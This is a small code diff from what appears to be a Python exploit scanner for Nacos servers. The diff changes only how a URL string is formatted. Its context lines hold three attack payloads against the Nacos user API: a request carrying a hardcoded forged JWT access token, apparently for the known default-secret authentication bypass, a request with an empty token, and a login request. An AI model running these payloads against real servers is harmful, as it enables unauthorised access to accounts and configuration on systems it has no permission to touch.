@@ -39,7 +39,7 @@ def wirte_targets(vurl, filename):
 def check_url(url):
 	url=parse.urlparse(url)
 	hostname  = url.hostname
-	url=url.scheme + '://' + url.netloc
+	url='{}://{}'.format(url[0],url[1])
 	payload1="{}/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9".format(url)
 	payload2="{}/nacos/v1/auth/users?accessToken=&pageNo=1&pageSize=9".format(url)
 	payload3="{}/nacos/v1/auth/users/login".format(url)
